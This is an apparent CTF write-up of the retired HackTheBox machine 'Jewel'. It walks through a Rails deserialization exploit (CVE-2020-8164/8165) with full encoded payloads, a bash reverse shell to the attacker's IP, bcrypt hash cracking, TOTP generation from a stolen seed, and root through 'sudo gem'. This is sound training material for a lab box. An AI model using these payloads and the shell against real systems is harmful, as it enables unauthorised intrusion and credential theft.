---
title: HTB: Jewel
url: https://0xdf.gitlab.io/2021/02/13/htb-jewel.html
date: 2021-02-13T14:45:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-jewel, hackthebox, nmap, gitweb, git, ruby, rails, gemfile, cve-2020-8164, cve-2020-8165, irb, deserialization, google-authenticator, totp, postgresql, penglab, hashcat, oathtool, gem
---

![Jewel](https://0xdfimages.gitlab.io/img/jewel-cover.png)

Jewel was all about Ruby, with a splash of Google Authenticator 2FA in the middle. I’ll start with an instance of GitWeb providing the source for a website. That source allows me to identify a Ruby on Rails deserialization exploit that provides code execution. To escalate, I’ll find the user’s password in the database, and the seed for the Google Authenticator to calculate the time-based one time password, both of which are needed to run sudo. From there, I can use GTFObins to get execution from the gem program.

## Box Info

| Name | [Jewel](https://hackthebox.com/machines/jewel)  [Jewel](https://hackthebox.com/machines/jewel) [Play on HackTheBox](https://hackthebox.com/machines/jewel) |
| --- | --- |
| Release Date | [10 Oct 2020](https://twitter.com/hackthebox_eu/status/1314193842908925953) |
| Retire Date | 13 Feb 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| Rated Difficulty | Rated difficulty for Jewel |
| Radar Graph | Radar chart for Jewel |
| First Blood User | 01:43:28[haqpl haqpl](https://app.hackthebox.com/users/76469) |
| First Blood Root | 02:59:53[Ziemni Ziemni](https://app.hackthebox.com/users/12507) |
| Creator | [polarbearer polarbearer](https://app.hackthebox.com/users/159204) |

## Recon

### nmap

`nmap` found three open TCP ports, SSH (22) and two HTTP (8000 and 8080):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.211
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-05 16:03 EST
Nmap scan report for 10.10.10.211
Host is up (0.013s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 13.48 seconds
root@kali# nmap -p 22,8000,8080 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.211
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-05 16:03 EST
Nmap scan report for 10.10.10.211
Host is up (0.012s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fd:80:8b:0c:73:93:d6:30:dc:ec:83:55:7c:9f:5d:12 (RSA)
|   256 61:99:05:76:54:07:92:ef:ee:34:cf:b7:3e:8a:05:c6 (ECDSA)
|_  256 7c:6d:39:ca:e7:e8:9c:53:65:f7:e2:7e:c7:17:2d:c3 (ED25519)
8000/tcp open  http    Apache httpd 2.4.38
|_http-generator: gitweb/2.20.1 git/2.20.1
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.38 (Debian)
| http-title: 10.10.10.211 Git
|_Requested resource was http://10.10.10.211:8000/gitweb/
8080/tcp open  http    nginx 1.14.2 (Phusion Passenger 6.0.6)
|_http-server-header: nginx/1.14.2 + Phusion Passenger 6.0.6
|_http-title: BL0G!
Service Info: Host: jewel.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.87 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 10 Buster.

### HTTP - TCP 8080

#### Site

The site is a generic blog:

![image-20201107161459862](https://0xdfimages.gitlab.io/img/image-20201107161459862.png)

The Articles link leads to a list of more generic articles. There are two authors, bill and jennifer.

I can use the “Sign Up” link to create an account:

![image-20201107161711604](https://0xdfimages.gitlab.io/img/image-20201107161711604.png)

Now I can log in, and the “Sign up” and “Log in” links are replaced by “Profile” and “Log out [0xdf]” links:

![image-20201107161834963](https://0xdfimages.gitlab.io/img/image-20201107161834963.png)

The “Profile” link leads me to a page where I can change my username:

![image-20201107161914606](https://0xdfimages.gitlab.io/img/image-20201107161914606.png)

If I try to change it to bill or jennifer, I get an error:

![image-20201107162038605](https://0xdfimages.gitlab.io/img/image-20201107162038605.png)

Changing it to admin works, but doesn’t seem to do anything special.

#### Headers

Looking at the HTTP headers, the server is returning quite a few:

```

HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Connection: close
Status: 200 OK
Cache-Control: max-age=0, private, must-revalidate
Referrer-Policy: strict-origin-when-cross-origin
X-Permitted-Cross-Domain-Policies: none
X-XSS-Protection: 1; mode=block
X-Request-Id: 064f5951-ebea-414b-adf8-2e19ea28e0cd
X-Download-Options: noopen
ETag: W/"6aa2da211c9effebaaf199d9cdce2145"
X-Frame-Options: SAMEORIGIN
X-Runtime: 0.006701
X-Content-Type-Options: nosniff
Date: Sat, 07 Nov 2020 21:17:18 GMT
Set-Cookie: _session_id=b41cd847588d73f52283a1a0261424c0; path=/; expires=Sat, 07 Nov 2020 21:22:18 GMT; HttpOnly
X-Powered-By: Phusion Passenger 6.0.6
Server: nginx/1.14.2 + Phusion Passenger 6.0.6
Content-Length: 2088

```

I did some Googling about “Phusion Passenger 6.0.6”, which [describes itself](https://www.phusionpassenger.com/) as:

> Passenger® is an app server that runs and automanages your web apps with ease. Also improves security, reliability and scalability.

`searchploit` and Googling for vulnerabilities didn’t find much.

#### Directory Brute Force

I did start a directory brute force with `gobuster`, but didn’t find anything interesting with it.

### gitweb - TCP 8000

The HTTP server here is running [gitweb](https://git-scm.com/docs/gitweb), a web version of Git. There’s only one project in this instance, called “BLOG!”:

![image-20201105162302631](https://0xdfimages.gitlab.io/img/image-20201105162302631.png)

The “log” link shows only one commit:

![image-20201105162334434](https://0xdfimages.gitlab.io/img/image-20201105162334434.png)

Clicking on “commit” takes me to the files in that commit:

[![image-20201107162810947](https://0xdfimages.gitlab.io/img/image-20201107162810947.png)](https://0xdfimages.gitlab.io/img/image-20201107162810947.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20201107162810947.png)

I can also click the “snapshot” link at the top and get a .`tar.gz` file containing the files from this commit to explore locally.

### Source Analysis

#### General

Looking through the files, it’s the source for the Blog site. There’s a `Gemfile`, which indicates that the site runs on Ruby.

The `Rakefile` (which is used to build Ruby apps) shows that it is built on Rails:

```

# Add your own tasks in files placed in lib/tasks ending in .rake,
# for example lib/tasks/capistrano.rake, and they will automatically be available to Rake.

require_relative 'config/application'

Rails.application.load_tasks

```

There’s a `bd.sql` file, which contains a `public.users` table with two hashes:

```
--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: rails_dev
--

COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;
1       bill    bill@mail.htb   2020-08-25 08:13:58.662464      2020-08-25 08:13:58.662464 $2a$12$uhUssB8.HFpT4XpbhclQU.Oizufehl9qqKtmdxTXetojn2FcNncJW
2       jennifer        jennifer@mail.htb       2020-08-25 08:54:42.8483        2020-08-25 08:54:42.8483 $2a$12$ik.0o.TGRwMgUmyOR.Djzuyb/hjisgk2vws1xYC/hxw8M1nFk0MQy
\.

```

I tried breaking these without success (I’ll show how later when I get another hash).

#### Vulnerabilities

The `Gemfile` defines all the plugins the application is using, and what versions.

```

source 'https://rubygems.org'
git_source(:github) { |repo| "https://github.com/#{repo}.git" }

ruby '2.5.5'

# Bundle edge Rails instead: gem 'rails', github: 'rails/rails'
gem 'rails', '= 5.2.2.1'
# Use postgresql as the database for Active Record
gem 'pg', '>= 0.18', '< 2.0'
# Use Puma as the app server
gem 'puma', '~> 3.11'
# Use SCSS for stylesheets
gem 'sass-rails', '~> 5.0'
# Use Uglifier as compressor for JavaScript assets
gem 'uglifier', '>= 1.3.0'
# See https://github.com/rails/execjs#readme for more supported runtimes
# gem 'mini_racer', platforms: :ruby

# Use CoffeeScript for .coffee assets and views
gem 'coffee-rails', '~> 4.2'
# Turbolinks makes navigating your web application faster. Read more: https://github.com/turbolinks/turbolinks
gem 'turbolinks', '~> 5'
# Build JSON APIs with ease. Read more: https://github.com/rails/jbuilder
gem 'jbuilder', '~> 2.5'
# Use Redis adapter to run Action Cable in production
gem 'redis', '~> 4.0'
# Use ActiveModel has_secure_password
gem 'bcrypt', '~> 3.1.7'

# Use ActiveStorage variant
# gem 'mini_magick', '~> 4.8'

# Use Capistrano for deployment
# gem 'capistrano-rails', group: :development

# Reduces boot times through caching; required in config/boot.rb
gem 'bootsnap', '>= 1.1.0', require: false

gem 'jquery-rails', '= 4.3.3'
gem 'bootstrap', '~> 4.5.0'
gem 'popper_js', '1.16.0'

gem 'will_paginate', '3.3.0'
gem 'bootstrap-will_paginate', '1.0.0'

group :development, :test do
  # Call 'byebug' anywhere in the code to stop execution and get a debugger console
  gem 'byebug', platforms: [:mri, :mingw, :x64_mingw]
end

group :development do
  # Access an interactive console on exception pages or by calling 'console' anywhere in the code.
  gem 'web-console', '>= 3.3.0'
  gem 'listen', '>= 3.0.5', '< 3.2'
  # Spring speeds up development by keeping your application running in the background. Read more: https://github.com/rails/spring
  gem 'spring'
  gem 'spring-watcher-listen', '~> 2.0.0'
end

group :test do
  # Adds support for Capybara system testing and selenium driver
  gem 'capybara', '>= 2.15'
  gem 'selenium-webdriver'
  # Easy installation and use of chromedriver to run system tests with Chrome
  gem 'chromedriver-helper'
end

# Windows does not include zoneinfo files, so bundle the tzinfo-data gem
gem 'tzinfo-data', platforms: [:mingw, :mswin, :x64_mingw, :jruby]

```

I started going through them one by one to look for any vulnerabilities. When I got to Rails, I found [CVE-2020-8164](https://www.rapid7.com/db/vulnerabilities/ruby_on_rails-cve-2020-8164), Ruby on Rails: Deserialization of Untrusted Data. The description reads:

> A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.

## Shell as bill

### Locate Attack Point

The documentation about this CVE isn’t terribly in depth. I’ll need to find a place in the source where the application is reading something out of memcache or redis. I can search in gitweb, and while memcache doesn’t return anything, redis does:

![image-20201108064838289](https://0xdfimages.gitlab.io/img/image-20201108064838289.png)

In both `application_controller.rb` and `users_controller.rb`, username is stored and fetched from redis. I’m not a Ruby expert, but this is enough to suggest I should try to put the payload there.

### Build a ping Payload

#### Using Rails

I didn’t find many proof of concept exploits except for [this one](https://github.com/masahiro331/CVE-2020-8165). It’s not terribly well documented, but knowing that deserialization attacks involve creating a serialized payload that will do malicious things when deserialized, I’ll try to recreate the same steps shown there. I’ll follow [these steps](https://gorails.com/setup/ubuntu/20.10) to install Rails in a VM (installing 2.6.3 to match the version in the application I’ll be using). I’ll use a random Ubuntu VM to not clutter up my Kali VM, but should work there as well.

To start the Rails console, I’ll need an application to play with, so I’ll use the one from the POC GitHub.

```

df@buntu:~$ git clone https://github.com/masahiro331/CVE-2020-8165.git
Cloning into 'CVE-2020-8165'...
remote: Enumerating objects: 96, done.
remote: Counting objects: 100% (96/96), done.
remote: Compressing objects: 100% (74/74), done.
remote: Total 96 (delta 13), reused 88 (delta 9), pack-reused 0
Unpacking objects: 100% (96/96), 1.02 MiB | 6.33 MiB/s, done.
df@buntu:~$ cd CVE-2020-8165/
df@buntu:~/CVE-2020-8165$ bundle install --path venndor/bundle
Warning: the running version of Bundler (1.17.2) is older than the version that created the lockfile (1.17.3). We suggest you upgrade to the latest version of Bundler by running `gem install bundler`.
The dependency tzinfo-data (>= 0) will be unused by any of the platforms Bundler is installing for. Bundler is installing for ruby but the dependency is only for x86-mingw32, x86-mswin32, x64-mingw32, java. To add those platforms to the bundle, run `bundle lock --add-platform x86-mingw32 x86-mswin32 x64-mingw32 java`.
Fetching gem metadata from https://rubygems.org/............
Fetching gem metadata from https://rubygems.org/.
Resolving dependencies...
Fetching rake 13.0.1
Installing rake 13.0.1
Fetching concurrent-ruby 1.1.6
Installing concurrent-ruby 1.1.6
...[snip]...

```

Now I can run the console:

```

df@buntu:~/CVE-2020-8165$ bundle exec rails console
Running via Spring preloader in process 132700
Loading development environment (Rails 5.2.3)
irb(main):001:0>

```

I’ll start with a payload that will `ping` my host to see that it works:

```

irb(main):001:0> code = '`ping -c 1 10.10.14.19`'
=> "`ping -c 1 10.10.14.19`"

```

The next few lines are just copied from the POC:

```

irb(main):002:0> erb = ERB.allocate
=> #<ERB:0x00005565f02ea080>
irb(main):003:0> erb.instance_variable_set :@src, code
=> "`ping -c 1 10.10.14.19`"
irb(main):004:0> erb.instance_variable_set :@filename, "1"
=> "1"
irb(main):005:0> erb.instance_variable_set :@lineno, 1
=> 1

```

The next line in the POC will cause an error, because `payload` isn’t a command. It works if I add an `=` between `payload` and `Marshal`:

```

irb(main):006:0> payload = Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
=> "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"\x1C`ping -c 1 10.10.14.19`\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"

```

Now I’ll use the `uri` module to encode and print the payload:

```

irb(main):010:0> require 'uri'
=> false
irb(main):011:0> puts URI.encode_www_form(payload: payload)
payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%1C%60ping+-c+1+10.10.14.19%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
=> nil

```

#### Modifying POC

I can get to the same result with a little bit of understanding of how serialized objects tend to work. The output from [the POC on GitHub](https://github.com/masahiro331/CVE-2020-8165) with a payload of `touch /tmp/rce` was this:

```

%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%15%60touch+%2Ftmp%2Frce%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T

```

I’m particularly interesting in the part around the command:

```

srcI%22%15%60touch+%2Ftmp%2Frce%60

```

A serialized payload often includes the length of the object and the contents. So I’d expect something that’s related to length (in this case 14 bytes), which could be that 0x22 or 0x15. In the payload I generated with `ping`, the payload was 21 characters long, and the 0x15 byte is not an 0x1c, where the 0x22 is unchanged. It looks like that 0x15 or 0x1c is the length of the given string plus 7.

Now I can generate new payloads by replacing the command string and the length byte (after adding 7).

### Deploy

Now I’ll head to the change username page on the site. To ensure that Firefox doesn’t encode anything, I’ll use Burp to intercept the POST request and change the username there:

```

POST /users/18 HTTP/1.1
Host: 10.10.10.211:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.211:8080/users/18/edit
Content-Type: application/x-www-form-urlencoded
Content-Length: 189
Connection: close
Cookie: _session_id=9cad63cc9ba727f097eea89d0897a5c6
Upgrade-Insecure-Requests: 1

utf8=%E2%9C%93&_method=patch&authenticity_token=dEbIRH3%2Bo0wlnp9yujf6GjqArxu33QV7eT1RpcmHIZGOnuWpJvYG%2BUFvZOupB87GfoXq9Hm%2B9MP7CVK9bf1FIA%3D%3D&user%5Busername%5D=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%22%1C%60ping+-c+1+10.10.14.19%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T&commit=Update+User

```

When I send that on, the page returns a 500 error.

However, if I refresh `/articles`, the page shows the ping results:

![image-20201108070903903](https://0xdfimages.gitlab.io/img/image-20201108070903903.png)

And I see the ping at `tcpdump` listening on my host:

```

root@kali# tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
07:05:54.834195 IP 10.10.10.211 > 10.10.14.19: ICMP echo request, id 1333, seq 1, length 64
07:05:54.834289 IP 10.10.14.19 > 10.10.10.211: ICMP echo reply, id 1333, seq 1, length 64
07:05:54.850773 IP 10.10.10.211 > 10.10.14.19: ICMP echo request, id 1334, seq 1, length 64
07:05:54.850862 IP 10.10.14.19 > 10.10.10.211: ICMP echo reply, id 1334, seq 1, length 64
07:05:54.867800 IP 10.10.10.211 > 10.10.14.19: ICMP echo request, id 1335, seq 1, length 64
07:05:54.867929 IP 10.10.14.19 > 10.10.10.211: ICMP echo reply, id 1335, seq 1, length 64

```

It’s interesting that it pings three times given that I used `-c 1`, but perhaps it is executed three times.

### Shell

To get a shell, I’ll use the same process, this time with `code` being a Bash reverse shell:

```

irb(main):010:0> code = '`bash -c "bash -i >& /dev/tcp/10.10.14.19/443 0>&1"`'
=> "`bash -c \"bash -i >& /dev/tcp/10.10.14.19/443 0>&1\"`"
irb(main):011:0> erb = ERB.allocate
=> #<ERB:0x00007f2e605598e0>
irb(main):012:0> erb.instance_variable_set :@src, code
=> "`bash -c \"bash -i >& /dev/tcp/10.10.14.19/443 0>&1\"`"
irb(main):013:0> erb.instance_variable_set :@filename, "1"
=> "1"
irb(main):014:0> erb.instance_variable_set :@lineno, 1
=> 1
irb(main):015:0> payload=Marshal.dump(ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :result)
=> "\x04\bo:@ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy\t:\x0E@instanceo:\bERB\b:\t@srcI\"9`bash -c \"bash -i >& /dev/tcp/10.10.14.19/443 0>&1\"`\x06:\x06ET:\x0E@filenameI\"\x061\x06;\tT:\f@linenoi\x06:\f@method:\vresult:\t@varI\"\f@result\x06;\tT:\x10@deprecatorIu:\x1FActiveSupport::Deprecation\x00\x06;\tT"
irb(main):016:0> puts URI.encode_www_form(payload: payload)
payload=%04%08o%3A%40ActiveSupport%3A%3ADeprecation%3A%3ADeprecatedInstanceVariableProxy%09%3A%0E%40instanceo%3A%08ERB%08%3A%09%40srcI%229%60bash+-c+%22bash+-i+%3E%26+%2Fdev%2Ftcp%2F10.10.14.19%2F443+0%3E%261%22%60%06%3A%06ET%3A%0E%40filenameI%22%061%06%3B%09T%3A%0C%40linenoi%06%3A%0C%40method%3A%0Bresult%3A%09%40varI%22%0C%40result%06%3B%09T%3A%10%40deprecatorIu%3A%1FActiveSupport%3A%3ADeprecation%00%06%3B%09T
=> nil

```

When I send that to the username, and then refresh `/articles`, I get a shell:

```

root@kali# nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.211.
Ncat: Connection from 10.10.10.211:45312.
bash: cannot set terminal process group (786): Inappropriate ioctl for device
bash: no job control in this shell
bill@jewel:~/blog$ id
uid=1000(bill) gid=1000(bill) groups=1000(bill)

```

I’ll upgrade to a full TTY:

```

bill@jewel:~/blog$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
bill@jewel:~/blog$ ^Z
[1]+  Stopped                 nc -lnvp 443
root@kali# stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
bill@jewel:~/blog$

```

From there, I can read `user.txt`:

```

bill@jewel:~$ cat user.txt
1867ef18************************

```

## Shell as root

### Enumeration

#### Home Dir

In bill’s home directory, there’s an interesting file, `.google_authenticator`:

```

bill@jewel:~$ ls -la
total 52
drwxr-xr-x  6 bill bill 4096 Sep 17 14:10 .
drwxr-xr-x  3 root root 4096 Aug 26 09:32 ..
lrwxrwxrwx  1 bill bill    9 Aug 27 11:26 .bash_history -> /dev/null
-rw-r--r--  1 bill bill  220 Aug 26 09:32 .bash_logout
-rw-r--r--  1 bill bill 3526 Aug 26 09:32 .bashrc
drwxr-xr-x 15 bill bill 4096 Sep 17 17:16 blog
drwxr-xr-x  3 bill bill 4096 Aug 26 10:33 .gem
-rw-r--r--  1 bill bill   43 Aug 27 10:53 .gitconfig
drwx------  3 bill bill 4096 Aug 27 05:58 .gnupg
-r--------  1 bill bill   56 Aug 28 07:00 .google_authenticator
drwxr-xr-x  3 bill bill 4096 Aug 27 10:54 .local
-rw-r--r--  1 bill bill  807 Aug 26 09:32 .profile
lrwxrwxrwx  1 bill bill    9 Aug 27 11:26 .rediscli_history -> /dev/null
-r--------  1 bill bill   33 Nov  8 11:28 user.txt
-rw-r--r--  1 bill bill  116 Aug 26 10:43 .yarnrc

```

It contains a seed for a TOTP two factor auth generator:

```

bill@jewel:~$ cat .google_authenticator 
2UQI3R52WFCLE6JTLDCSJYMJH4
" WINDOW_SIZE 17
" TOTP_AUTH

```

#### sudo

I always check `sudo -l`, but in this case, it asks for a password:

```

bill@jewel:~$ sudo -l
[sudo] password for bill: 

```

#### Database Enumeration

In `database.yml` in the `blog` directory, there’s creds to connect to the DB:

```

bill@jewel:~/blog/config$ cat database.yml | grep -v "#" | grep .
default: &default
  adapter: postgresql
  encoding: unicode
  pool: <%= ENV.fetch("RAILS_MAX_THREADS") { 5 } %>
development:
  <<: *default
  database: blog_development
  host: localhost
  port: 5432
  username: rails_dev
  password: beiw,aDoed1
test:
  <<: *default
  database: blog_test
  host: localhost
  port: 5432
  username: rails_dev
  password: beiw,aDoed1
production:
  <<: *default
  database: blog_development
  host: localhost
  port: 5432
  username: rails_dev
  password: beiw,aDoed1

```

The production db is `blog_development`. I can connect to it with, entering the password when prompted:

```

bill@jewel:~/blog/config$ psql -h localhost -U rails_dev -d blog_development 
Password for user rails_dev: 
psql (11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

blog_development=>

```

There are five tables:

```

blog_development=> \dt  
                 List of relations
 Schema |         Name         | Type  |   Owner   
--------+----------------------+-------+-----------
 public | ar_internal_metadata | table | rails_dev
 public | articles             | table | rails_dev
 public | comments             | table | rails_dev
 public | schema_migrations    | table | rails_dev
 public | users                | table | rails_dev
(5 rows)

```

The `users` table is most interesting:

```

blog_development=> select * from users;
WARNING: terminal is not fully functional
-  (press RETURN) id | username |       email       |         created_at         |         update
d_at         |                       password_digest                        | ca
n_write 
----+----------+-------------------+----------------------------+---------------
-------------+--------------------------------------------------------------+---
--------
  1 | bill     | bill@mail.htb     | 2020-08-26 10:24:03.878232 | 2020-08-28 07:
25:07.771852 | $2a$12$bRdLRbs0ui6fMavqMcXC1.4YY4TLIzfJfqNrm1AqWsZKLYWRxwc/2 | t
  2 | jennifer | jennifer@mail.htb | 2020-08-27 05:44:28.551735 | 2020-08-28 07:
25:32.886657 | $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO | t
 18 | 0xdf     | 0xdf@htb.htb      | 2020-11-06 21:08:56.251308 | 2020-11-06 21:
08:56.251308 | $2a$12$go.ikIXm.O1zGm8V.UIS5uN.U8Ffv4YesbXRNeP2bzQl2iYl5xxEW | f
(3 rows)

```

There are two hashes in there that don’t belong to a user I created, but both match what I found in the gitweb dump earlier and was unable to crack.

#### Database Backup

In `/var/backups` there’s an SQL dump file that contains the same two users, but this time bill’s password hash is different:

```

bill@jewel:/var/backups$ cat dump_2020-08-27.sql 
...[snip]...
--
-- Data for Name: users; Type: TABLE DATA; Schema: public; Owner: rails_dev
--                              
                                                                                                     
COPY public.users (id, username, email, created_at, updated_at, password_digest) FROM stdin;
2       jennifer        jennifer@mail.htb       2020-08-27 05:44:28.551735      2020-08-27 05:44:28.551735      $2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
1       bill    bill@mail.htb   2020-08-26 10:24:03.878232      2020-08-27 09:18:11.636483      $2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW
\.  
...[snip]...

```

#### Crack Hash

I fired up [Penglab](https://github.com/mxrch/penglab) and tossed the hash in. I set it up like:

```

mode = 3200
hashes = """
bill:$2a$12$bRdLRbs0ui6fMavqMcXC1.4YY4TLIzfJfqNrm1AqWsZKLYWRxwc/2
bill-backup:$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW
jennifer:$2a$12$sZac9R2VSQYjOcBTTUYy6.Zd.5I02OnmkKnD3zA6MqMrzLKz0jeDO
"""
with open('hashes','w') as f:
  f.write(hashes)

```

The run:

```

!time hashcat -m {mode} ./hashes /content/wordlists/rockyou.txt --user

```

It broke pretty quickly:

```

$2a$12$QqfetsTSBVxMXpnTR.JfUeJXcJRHv5D5HImL0EHI7OzVomCrqlRxW:spongebob

```

### 2FA

With bill’s password, I tried `sudo -l` again. The password was accepted, but it returned another prompt:

```

bill@jewel:~/blog/config$ sudo -l
[sudo] password for bill: 
Verification code:

```

This is likely the two factor request that the `.google_authenticator` was about.

On my local machine I installed [oathtool](https://www.nongnu.org/oath-toolkit/man-oathtool.html) with `apt install oathtool`. Now I can run it and it will show me the code at any given time. In fact, I can run it with `watch` and it will update every 2 seconds with the current token.

```

root@kali# oathtool -b --totp '2UQI3R52WFCLE6JTLDCSJYMJH4'
699658

```

Now I can see what bill can `sudo`:

```

bill@jewel:~$ sudo -l
[sudo] password for bill: 
Verification code: 
Matching Defaults entries for bill on jewel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    insults

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem

```

It is important to make sure that your local clock is in sync with the clock on Jewel, as this is a time based code.

### gem

Since bill can run `sudo gem`, now is a good time to check [gtfobins](https://gtfobins.github.io/gtfobins/gem/#sudo), which provides the following:

```

sudo gem open -e "/bin/sh -c /bin/sh" rdoc

```

I’ll give it a try, and it works:

```

bill@jewel:~$ sudo -l                                            
[sudo] password for bill: 
Verification code: 
Matching Defaults entries for bill on jewel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    insults

User bill may run the following commands on jewel:
    (ALL : ALL) /usr/bin/gem
bill@jewel:~$ sudo gem open -e "/bin/sh -c /bin/sh" rdoc
# id
uid=0(root) gid=0(root) groups=0(root)

```

And I can grab `root.txt`:

```

# cat /root/root.txt
d6386b83************************

```